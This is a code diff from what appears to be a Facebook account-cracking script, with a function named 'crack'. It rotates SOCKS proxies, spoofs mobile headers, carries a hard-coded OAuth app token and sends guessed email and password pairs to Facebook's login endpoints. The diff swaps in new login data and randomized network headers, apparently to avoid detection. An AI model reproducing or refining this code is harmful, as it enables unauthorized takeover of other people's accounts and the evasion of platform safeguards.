@@ -487,29 +487,32 @@ def crack(idf,pwv):
 			proxs= {'http': 'socks4://'+nip}
 			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate, sdch","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-			data = {
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':ids,
-                                'password':pas,
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'fb_api_req_friendly_name':'authenticate',
-                        }
-            header_freefb = {'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':"[FBAN/FB4A;FBAV/"+zomir+".0.0.6.119;FBBV/30034644;FBDM/{density=3.02,width=720,height=1544};FBLC/en_US;FBCR/ZONG;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/"+cph+";FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
+			log_data = {
+            "adid": str(uuid.uuid4()),
+            "device_id": str(uuid.uuid4()),
+            "email": uid,
+            "password": pww,
+            "cpl": "fales",
+            "source": "device_based_login",
+            "format": "json",
+            "generate_session_cookies": "1",
+            "generate_analytic_claims": "1",
+            "generate_machine_id": "1",
+            "locale": "GB",
+            "country_code": "GB",
+            "client_country_code": "GB",
+            "currently_logged_in_userid": "0",
+        }
+            header_freefb = {
+            "User-Agent": ua,
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Connection-Quality": "EXCELLENT",
+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-HTTP-Engine": "Liger",
+        } 
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
 			heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, sdch', 'accept-language': 'en-US,en;q=0.9'}
